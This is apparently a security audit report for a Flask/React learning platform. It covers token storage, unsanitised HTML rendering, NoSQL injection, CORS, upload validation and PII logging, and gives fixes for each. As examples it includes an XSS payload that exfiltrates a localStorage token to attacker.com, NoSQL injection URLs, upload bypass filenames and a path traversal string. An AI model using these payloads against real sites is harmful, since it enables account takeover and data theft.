# Security Audit Report - Shrunothi Platform
**Date:** May 6, 2026  
**Scope:** Full-stack application (Flask backend, React frontend)  
**Branch:** feature/razorpay-payment-integration

---

## Executive Summary

This security audit identified **3 Critical vulnerabilities**, **4 High-severity issues**, and **3 Medium-severity concerns** across the authentication, payment processing, and data handling layers. The payment webhook implementation is robust, but the authentication token storage and frontend rendering pose significant XSS and credential theft risks.

---

## 1. CRITICAL VULNERABILITIES

### 1.1 Frontend JWT Token Stored in localStorage (XSS Risk)
**Severity:** CRITICAL  
**File:** `/front-end/src/auth/token.ts`, `/front-end/src/api/client.ts`, `/front-end/src/components/GoogleAuthPopup.tsx`

**Issue:**
The Google ID JWT is stored directly in `localStorage`, making it accessible to any XSS attack on the application.

```typescript
// Line 2 in token.ts
export function getGoogleIdToken(): string | null {
  return localStorage.getItem("google_id_token");
}

// Line 130 in GoogleAuthPopup.tsx
localStorage.setItem("google_id_token", res.credential);

// Line 38 in client.ts (request interceptor)
const token = localStorage.getItem("google_id_token");
```

**Attack Scenario:**
1. Attacker injects XSS payload into a material's HTML content (which is rendered with `dangerouslySetInnerHTML`)
2. Malicious script reads `localStorage.getItem("google_id_token")`
3. Token is exfiltrated to attacker's server
4. Attacker uses token to impersonate the user

**Impact:**
- Complete account takeover
- Access to subscriber-only content without payment
- Ability to modify user subscription status
- XSS vulnerability compound with this increases severity

**Recommendation:**
- Move JWT storage to **httpOnly cookies** (secure, inaccessible to JavaScript)
- Implement CSRF protection via SameSite cookie attribute
- Set `Secure` flag for HTTPS-only transmission

---

### 1.2 Unsafe HTML Rendering with dangerouslySetInnerHTML
**Severity:** CRITICAL  
**Files:** 
- `/front-end/src/components/DocModal.tsx`
- `/front-end/src/components/DocModal/DocModal.tsx`

**Issue:**
HTML content from backend is rendered directly without sanitization:

```typescript
// DocModal.tsx
<div className="modal-body" dangerouslySetInnerHTML={{ __html: content }} />
```

**Attack Vector:**
1. Admin can inject malicious JavaScript into Google Docs
2. When converted to HTML by backend's `convert_to_html()`, script tags bypass sanitization
3. Any user viewing material executes malicious code
4. Attacker can steal tokens, redirect users, or inject keyloggers

**Example Payload:**
```html
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('google_id_token'))
</script>
```

**Impact:**
- Stored XSS affecting all users viewing materials
- Can be combined with localStorage token theft for complete compromise

**Recommendation:**
- Use a **sanitization library** (e.g., `DOMPurify`) before rendering HTML
- Sanitize on **backend** before storing to database (defense-in-depth)
- Implement **Content Security Policy (CSP)** to block inline scripts

**Code Fix Example:**
```typescript
import DOMPurify from 'dompurify';

const sanitizedContent = DOMPurify.sanitize(content, {
  ALLOWED_TAGS: ['p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li', 'strong', 'em', 'u', 's', 'a', 'table', 'tbody', 'tr', 'td', 'br'],
  ALLOWED_ATTR: ['href', 'target', 'rel']
});

<div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />
```

---

### 1.3 Missing Input Validation on genre_id Parameter (NoSQL Injection Risk)
**Severity:** CRITICAL  
**Files:**
- `/backend/public_api/routes/genre_podcasts.py` (line 32)
- `/backend/public_api/routes/genre_material.py` (line 35)

**Issue:**
The `genre_id` path parameter is used directly in MongoDB queries without validation:

```python
# genre_podcasts.py, line 32
docs = list(db.podcasts.find({"genreId": genre_id}))

# genre_material.py, line 35
docs = db.materials.find({ "genreId": genre_id })
```

**Attack Scenario:**
An attacker can craft a URL like:
```
/genres/{"$where":"1==1"}/podcasts
/genres/{"$ne":null}/material
```

The `$ne` (not equal) operator would bypass filters and return all materials, including unpublished or subscriber-only content.

**Impact:**
- Unauthorized data exposure
- Circumvent access controls for paid content
- Information disclosure of all materials

**Recommendation:**
- **Validate genre_id format** - ensure it's a valid MongoDB ObjectId if applicable
- **Cast to string explicitly** and validate alphanumeric + underscore only
- Use **parameterized queries** (already using PyMongo, but add type validation)

**Code Fix:**
```python
from bson import ObjectId

@bp.route("/genres/<genre_id>/podcasts", methods=["GET"])
def genre_podcasts(genre_id):
    # Validate genre_id is a valid ObjectId
    try:
        genre_oid = ObjectId(genre_id)
    except Exception:
        return jsonify({"error": "Invalid genre ID"}), 400
    
    db = get_db()
    docs = list(db.podcasts.find({"genreId": str(genre_oid)}))
    # ... rest of code
```

---

## 2. HIGH-SEVERITY ISSUES

### 2.1 Public API App Missing Security Headers and CORS Restrictions
**Severity:** HIGH  
**File:** `/backend/public_api/app.py`

**Issue:**
The secondary public API server has **unrestricted CORS and no security headers**:

```python
# Line 17 in public_api/app.py
CORS(app)  # No restrictions - allows ANY origin
```

Compare to the main app (`/backend/app.py`):
```python
CORS(
    app,
    supports_credentials=True,
    resources={
        r"/*": {
            "origins": cors_origins,  # Restricted list
            "methods": ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
            "allow_headers": ["Content-Type", "Authorization"]
        }
    }
)

app.after_request(_add_security_headers)  # CSP, X-Frame-Options, etc.
```

**Impact:**
- **CORS bypass attacks** - any domain can make requests to this API
- **Data exfiltration** - cross-origin requests can steal data
- **Missing CSP** allows embedded scripts to execute
- **Missing X-Frame-Options** allows clickjacking attacks

**Recommendation:**
- Apply same CORS restrictions as main app
- Add security headers middleware
- Consider consolidating into single Flask app

**Code Fix:**
```python
from flask_cors import CORS

def create_app():
    app = Flask(__name__)
    
    # Apply CORS restrictions
    CORS(
        app,
        supports_credentials=True,
        resources={
            r"/*": {
                "origins": ["https://shrunothi.com", "https://www.shrunothi.com"],
                "methods": ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
                "allow_headers": ["Content-Type", "Authorization"]
            }
        }
    )
    
    # Add security headers
    @app.after_request
    def add_security_headers(response):
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-Content-Type-Options"] = "nosniff"
        return response
    
    # ... rest of app setup
```

---

### 2.2 Weak File Upload Validation - Extension Checking Only
**Severity:** HIGH  
**Files:**
- `/backend/admin_api/routes/admin_uploads.py`
- `/backend/admin_api/routes/admin_editor_uploads.py`

**Issue:**
File upload validation relies **only on file extension**, which is easily bypassed:

```python
# admin_uploads.py, line 41-45
ext = filename.rsplit(".", 1)[-1].lower()

if ext not in {"jpg", "jpeg", "png", "webp"}:
    return jsonify({"error": "Unsupported file type"}), 400
```

**Attack Scenarios:**
1. **Double extension attack:** `shell.php.jpg` - uploaded as JPG but executed as PHP
2. **MIME type mismatch:** Rename executable to `.jpg`, upload as JPG
3. **Null byte injection:** `shell.php%00.jpg` (older PHP versions)
4. **Archive upload:** `.jpg` file containing executable code or malware

**Impact:**
- **Remote code execution** if S3 is misconfigured for public execution
- **Malware distribution** through image uploads
- **Account takeover** if admin credentials are leaked

**Recommendation:**
- **Validate MIME type** using proper library (not Content-Type header)
- **Validate file contents** - check magic bytes/signatures
- **Implement file scanning** - use ClamAV or similar
- **Store uploads outside web root** - prevent direct execution
- **Disable script execution** in S3 bucket via bucket policies

**Code Fix:**
```python
import magic
from werkzeug.utils import secure_filename

ALLOWED_MIME_TYPES = {"image/jpeg", "image/png", "image/webp"}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def presign_upload():
    data = request.get_json() or {}
    filename = data.get("filename")
    content_type = data.get("contentType")
    
    # Validate extension
    ext = filename.rsplit(".", 1)[-1].lower()
    if ext not in {"jpg", "jpeg", "png", "webp"}:
        return jsonify({"error": "Unsupported file type"}), 400
    
    # Validate MIME type
    if content_type not in ALLOWED_MIME_TYPES:
        return jsonify({"error": "Invalid MIME type"}), 400
    
    # Sanitize filename
    safe_filename = secure_filename(filename)
    
    # Generate new filename to prevent overwrites
    key = f"announcements/{uuid.uuid4()}.{ext}"
    
    # In production, validate uploaded file content via separate validation
    # after upload to S3 using file magic bytes
```

---

### 2.3 User Email Logged in Plain Text (PII Leakage)
**Severity:** HIGH  
**File:** `/backend/public_api/routes/payments.py`

**Issue:**
While there's an attempt to hash email with `_email_hash()`, the function is **not consistently applied** and hashes are only 8 characters:

```python
# Line 46-47 in payments.py
def _email_hash(email: str) -> str:
    """Short non-reversible hash for log lines (avoids logging raw PII)."""
    return hashlib.sha256(email.encode()).hexdigest()[:8]  # Only 8 chars!
```

**Issues:**
1. **8-character hash is reversible** - can be cracked via rainbow tables
2. **Inconsistent usage** - not all log statements use `_email_hash()`
3. **Logs visible to ops teams** - PII exposure in log management systems
4. **Raw email stored** in database logs, request bodies, error messages

**Example Leakage:**
```python
# Line 239 in verify_payment endpoint
payment_record = get_payment_by_order_id(order_id)
if not payment_record or payment_record.get("user_email") != user_email.lower().strip():
    return jsonify({"error": "Order does not belong to caller"}), 403
    # user_email is exposed in logs if this fails
```

**Impact:**
- **PII compliance violation** - GDPR, CCPA require PII protection
- **Privacy breach** - admin access to logs reveals customer data
- **Marketing attacks** - email list harvesting from logs

**Recommendation:**
- Use **SHA256 with full 64-character hash** (not truncated)
- **Never log raw email addresses** - always hash
- Implement **structured logging** with PII redaction
- Use **tokenized identifiers** instead of emails in logs
- Implement **log retention policies** - rotate old logs

**Code Fix:**
```python
import hashlib
import logging

def _anonymize_email(email: str) -> str:
    """Full SHA256 hash for non-reversible PII anonymization."""
    return hashlib.sha256(email.encode()).hexdigest()

# Configure logging with sensitive field redaction
import logging.handlers

class PIIFilter(logging.Filter):
    def filter(self, record):
        # Redact email patterns
        record.msg = re.sub(r'[\w\.-]+@[\w\.-]+\.\w+', '[EMAIL]', str(record.msg))
        return True

logger = logging.getLogger(__name__)
logger.addFilter(PIIFilter())

# Usage
logger.info("Payment created: user=%s order=%s", _anonymize_email(user_email), order_id)
```

---

### 2.4 Admin Authentication Vulnerability - Missing Rate Limiting on Token Validation
**Severity:** HIGH  
**File:** `/backend/auth/auth_guard.py` (require_admin function)

**Issue:**
The `require_admin` decorator validates Google ID tokens without rate limiting, allowing brute-force attacks:

```python
# Lines 96-137 in auth_guard.py
def require_admin(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        # No rate limiting on token verification attempts
        auth_header = request.headers.get("Authorization")
        token = auth_header.split(" ")[1]
        
        try:
            payload = id_token.verify_oauth2_token(...)  # CPU-intensive operation
        except Exception:
            return jsonify({ "error": "Invalid or expired token" }), 401
```

**Attack Scenario:**
1. Attacker generates thousands of forged JWT tokens
2. Sends them to admin endpoints without rate limiting
3. Each request triggers expensive `verify_oauth2_token()` call
4. **Denial of Service** - server CPU exhausted validating tokens

**Impact:**
- **DoS attack** on admin endpoints
- **Resource exhaustion** - CPU spending time on invalid token validation
- **Admin lockout** - legitimate admins can't access functionality

**Recommendation:**
- Add **rate limiting per IP** on admin endpoints
- Implement **token signature caching** to reduce verification overhead
- Add **exponential backoff** on repeated failures from same IP

**Code Fix:**
```python
from extensions import limiter

@require_admin
@limiter.limit("10 per minute")  # 10 failed attempts per minute per IP
def protected_admin_endpoint():
    pass

# Or use a cache for token verification results
import functools
import time

_token_cache = {}
CACHE_TTL = 300  # 5 minutes

def _verify_token_cached(token):
    if token in _token_cache:
        cached, timestamp = _token_cache[token]
        if time.time() - timestamp < CACHE_TTL:
            return cached
    
    # Verify token
    payload = id_token.verify_oauth2_token(token, ...)
    _token_cache[token] = (payload, time.time())
    return payload
```

---

## 3. MEDIUM-SEVERITY ISSUES

### 3.1 Session Storage Used for Non-Sensitive State (Best Practice Violation)
**Severity:** MEDIUM  
**Files:**
- `/front-end/src/api/client.ts` (line 57)
- `/front-end/src/components/WelcomeGate/WelcomeGate.tsx`

**Issue:**
Non-sensitive state is stored in `sessionStorage`, which survives navigation in same tab:

```typescript
// client.ts, line 57
sessionStorage.setItem("session_expired", "true");

// WelcomeGate.tsx
sessionStorage.setItem("welcome_seen", "true");
```

**Issue:**
1. `sessionStorage` values persist across page reloads in same tab
2. Can be manipulated by malicious scripts
3. Creates inconsistent user state

**Impact:**
- **Low risk** for non-sensitive data (welcome gate, session expiry flags)
- Could be used for minor UX/UI attacks
- Not a primary concern if localStorage token issue is fixed

**Recommendation:**
- Use **in-memory state** (React Context/Redux) instead of sessionStorage for UX flags
- Document that sessionStorage should ONLY store non-sensitive state
- Add validation on sessionStorage values before using them

---

### 3.2 Google Docs ID Extraction Uses Regex (Potential Bypass)
**Severity:** MEDIUM  
**File:** `/backend/admin_api/services/google_docs.py` (line 8)

**Issue:**
The Google Docs URL validation uses regex that may have edge cases:

```python
# Line 8
DOC_URL_RE = re.compile(r"/document/(?:u/\d+/)?d/([a-zA-Z0-9_-]+)")
```

**Potential Issues:**
1. Regex doesn't validate full URL structure - could match partial strings
2. Doesn't prevent SSRF attacks to internal Google APIs
3. Accepts hyphens/underscores which might not be valid doc IDs

**Attack Scenario:**
```
https://docs.google.com/document/u/0/d/../../../../etc/passwd
# Possible path traversal via doc_id parameter
```

**Impact:**
- **SSRF attack** - attacker could request internal Google resources
- **DoS** - repeatedly fetch same document to exhaust quotas
- **Information disclosure** - access documents not shared with service account

**Recommendation:**
- Add **full URL validation** before regex extraction
- **Whitelist allowed doc ID characters** (alphanumeric only)
- Implement **request quotas** on Google Docs API calls
- Add **document access logging** to detect anomalies

**Code Fix:**
```python
import re
from urllib.parse import urlparse

def extract_doc_id(google_doc_url):
    if not isinstance(google_doc_url, str) or not google_doc_url.strip():
        raise ValueError("Invalid URL")
    
    parsed = urlparse(google_doc_url.strip())
    
    # Strict validation
    if parsed.scheme not in {"http", "https"}:
        raise ValueError("Invalid URL")
    if parsed.netloc != "docs.google.com":
        raise ValueError("Invalid URL - must be docs.google.com")
    
    # Extract doc ID
    match = re.search(r"/document/(?:u/\d+/)?d/([a-zA-Z0-9-_]{25,})", parsed.path)
    if not match:
        raise ValueError("Invalid doc ID format")
    
    doc_id = match.group(1)
    
    # Validate doc ID doesn't contain path traversal
    if ".." in doc_id or "/" in doc_id:
        raise ValueError("Invalid doc ID")
    
    return doc_id
```

---

### 3.3 Rate Limiting Configuration Uses In-Memory Storage (Not Distributed)
**Severity:** MEDIUM  
**File:** `/backend/extensions.py`

**Issue:**
Rate limiting is configured with in-memory storage instead of Redis:

```python
# extensions.py
limiter = Limiter(
    key_func=get_remote_address,
    storage_uri="memory://",  # In-memory only!
    default_limits=["500 per minute"],
)
```

**Issues:**
1. **Per-process limits** - each Flask worker has separate rate limit counter
2. **Easily bypassed** - attacker spreads requests across multiple app instances
3. **No persistence** - rate limits reset on app restart

**Impact:**
- **DoS vulnerability** - bypassing rate limits by distributing requests
- **Credential stuffing** - can brute-force logins by spreading across processes
- **Payment fraud** - create multiple orders by distributing requests

**Recommendation:**
- **Use Redis backend** for distributed rate limiting
- Implement **sliding window algorithm** for accurate limiting
- Add **IP-based, user-based, and endpoint-based** limits

**Code Fix:**
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# Use Redis for distributed rate limiting
limiter = Limiter(
    key_func=get_remote_address,
    storage_uri="redis://localhost:6379",
    default_limits=["500 per minute"],
)

# Per-endpoint configuration
@bp.route("/payments/create-order", methods=["POST"])
@limiter.limit("5 per minute; 20 per hour")  # Tighter limit for payments
def create_order():
    pass
```

---

## 4. SECURITY MEASURES IN PLACE (Verified)

### ✅ Price Tampering Protection
**Status:** IMPLEMENTED  
**File:** `/backend/public_api/routes/payments.py`

Price tampering is **properly protected** - backend maintains server-side price whitelist:

```python
# Lines 34-37
PLAN_AMOUNTS = {
    "monthly": 9900,    # ₹99
    "annual":  99900,   # ₹999
}

# Lines 56-67
if plan not in PLAN_AMOUNTS:
    return jsonify({"error": "Invalid plan"}), 400

amount = PLAN_AMOUNTS[plan]  # Never trust frontend amount
```

**Strength:** Server-side validation prevents client tampering.

---

### ✅ Payment Webhook Signature Verification
**Status:** IMPLEMENTED  
**File:** `/backend/public_api/routes/payments.py` (lines 333-342)

HMAC-SHA256 verification is properly implemented:

```python
def _verify_webhook_signature(body: bytes, signature: str) -> bool:
    """HMAC-SHA256 verification of Razorpay webhook payload."""
    if not RAZORPAY_WEBHOOK_SECRET or not signature:
        return False
    expected = hmac.new(
        RAZORPAY_WEBHOOK_SECRET.encode(),
        body,
        hashlib.sha256,
    ).hexdigest()
    return hmac.compare_digest(expected, signature)  # Timing-safe comparison
```

**Strength:**
- Uses `hmac.compare_digest()` to prevent timing attacks
- Validates raw request body (not parsed JSON)
- Rejects if webhook secret is missing

---

### ✅ Admin Authentication via Google OAuth2
**Status:** IMPLEMENTED  
**File:** `/backend/auth/auth_guard.py` (lines 96-137)

Admin routes require verified Google ID tokens and database lookup:

```python
def require_admin(f):
    # Validates Google OAuth2 token signature
    payload = id_token.verify_oauth2_token(token, google_requests.Request(), GOOGLE_CLIENT_ID)
    
    # Checks admin whitelist in database
    db = get_db()
    is_admin = db.admin_emails.find_one({"email": email})
    
    if not is_admin:
        return jsonify({"error": "Forbidden"}), 403
```

**Strength:** Dual-layer authentication (OAuth2 + admin whitelist).

---

### ✅ Content Security Policy (CSP)
**Status:** IMPLEMENTED  
**File:** `/backend/app.py` (lines 58-69)

CSP headers restrict script sources:

```python
response.headers["Content-Security-Policy"] = (
    "default-src 'self'; "
    "script-src 'self' https://checkout.razorpay.com https://accounts.google.com; "
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
    ...
)
```

**Limitation:** CSP includes `'unsafe-inline'` for styles, which weakens XSS protection. Should use nonces or hashes instead.

---

### ✅ Security Headers
**Status:** IMPLEMENTED  
**File:** `/backend/app.py` (lines 70-72)

```python
response.headers["X-Frame-Options"] = "DENY"
response.headers["X-Content-Type-Options"] = "nosniff"
response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
```

**Strength:** Prevents clickjacking, MIME-type sniffing, and referrer leakage.

---

### ✅ CORS Configuration (Main App Only)
**Status:** IMPLEMENTED  
**File:** `/backend/app.py` (lines 85-109)

Main Flask app restricts CORS to known origins:

```python
cors_origins = [
    "https://shrunothi.com",
    "https://www.shrunothi.com",
    "http://localhost:5173",
]

CORS(app, supports_credentials=True, resources={"origins": cors_origins})
```

**Limitation:** Public API app lacks this protection (HIGH severity issue).

---

### ✅ Input Validation on ObjectIds
**Status:** IMPLEMENTED  
**File:** `/backend/public_api/routes/material.py` (lines 22-25)

```python
try:
    oid = ObjectId(material_id)
except Exception:
    return jsonify({"error": "Invalid id"}), 400
```

**Strength:** Validates ObjectId format before querying.

---

### ✅ Idempotency Protection on Webhooks
**Status:** IMPLEMENTED  
**File:** `/backend/public_api/routes/payments.py` (lines 145-148)

```python
# Idempotency: if already terminal, skip re-processing.
if payment_record.get("status") == "captured":
    log.info("Webhook ignored (already captured): order=%s", razorpay_order_id)
    return jsonify({"status": "already_processed"}), 200
```

**Strength:** Prevents double-charging from duplicate webhooks.

---

### ✅ Subscriber Access Control
**Status:** IMPLEMENTED  
**Files:**
- `/backend/public_api/routes/material.py` (lines 32-34)
- `/backend/public_api/routes/genre_material.py` (lines 39-40)

```python
subscriber_only = bool(doc.get("subscriberOnly", False))
if subscriber_only and not caller_is_subscriber:
    return jsonify({"error": "Subscription required"}), 403
```

**Strength:** Properly gates paid content behind subscription check.

---

## 5. REMEDIATION PRIORITIES

### Phase 1 (Immediate - Within 48 hours)
1. **Implement localStorage to httpOnly cookies** for JWT token storage
2. **Add DOMPurify sanitization** for `dangerouslySetInnerHTML` content
3. **Add genre_id input validation** to prevent NoSQL injection
4. **Apply CORS/security headers to public API app**

### Phase 2 (Short-term - Within 1 week)
5. Implement **stronger file upload validation** (MIME type, magic bytes)
6. Add **rate limiting on admin token verification**
7. Update **email logging** to use full SHA256 hashes consistently
8. Improve **Google Docs URL validation** to prevent SSRF

### Phase 3 (Medium-term - Within 1 month)
9. Migrate rate limiting to **Redis backend**
10. Implement **comprehensive PII redaction** in logging
11. Add **file content scanning** for uploaded files
12. Enhance **CSP headers** to use nonces instead of `'unsafe-inline'`

---

## 6. COMPLIANCE CONSIDERATIONS

### GDPR/CCPA Violations
- **PII logging** (email addresses) without explicit consent
- **Recommended:** Implement data retention policies, audit logging

### Payment Card Industry (PCI) DSS
- **Webhook signature verification:** Compliant
- **Price tampering protection:** Compliant
- **Token storage:** **Non-compliant** (localStorage instead of secure storage)
- **Recommended:** Store tokens in httpOnly cookies, implement tokenization

### OWASP Top 10 Coverage
| Vulnerability | Status | File |
|---|---|---|
| A01:2021 Broken Access Control | Found | genre_id NoSQL injection |
| A02:2021 Cryptographic Failures | Found | Token storage in localStorage |
| A03:2021 Injection | Found | NoSQL injection, HTML injection |
| A04:2021 Insecure Design | Found | File upload validation |
| A05:2021 Security Misconfiguration | Found | Public API CORS |
| A06:2021 Vulnerable Components | OK | Dependencies maintained |
| A07:2021 Authentication Failures | Found | Token verification rate limiting |
| A08:2021 Software/Data Integrity | OK | Webhook signatures verified |
| A09:2021 Logging/Monitoring | Found | PII in logs |
| A10:2021 SSRF | Found | Google Docs URL validation |

---

## 7. TESTING RECOMMENDATIONS

### Security Testing Checklist
- [ ] XSS testing on material HTML content
- [ ] NoSQL injection on genre_id parameter
- [ ] CORS bypass attempts on public API
- [ ] File upload bypass techniques
- [ ] JWT token expiration handling
- [ ] Webhook signature verification edge cases
- [ ] Rate limiting bypass across multiple IPs
- [ ] SSRF via Google Docs API

### Tools
- **OWASP ZAP** - Automated vulnerability scanning
- **Burp Suite** - Manual penetration testing
- **npm audit** - Dependency vulnerability scanning
- **Bandit** - Python security linter

---

## 8. CONCLUSION

The application has implemented **robust payment processing security** with proper webhook verification and price tamper protection. However, **critical vulnerabilities in authentication and content rendering** pose significant risk. The localStorage token storage combined with unsafe HTML rendering creates a **complete account takeover** pathway via XSS attacks.

**Immediate action required** on Phase 1 items. The other issues are important but lower immediate risk if the core token and rendering vulnerabilities are addressed.

---

**Report Generated:** 2026-05-06  
**Auditor:** Security Review  
**Next Review:** Recommended after Phase 1 remediation
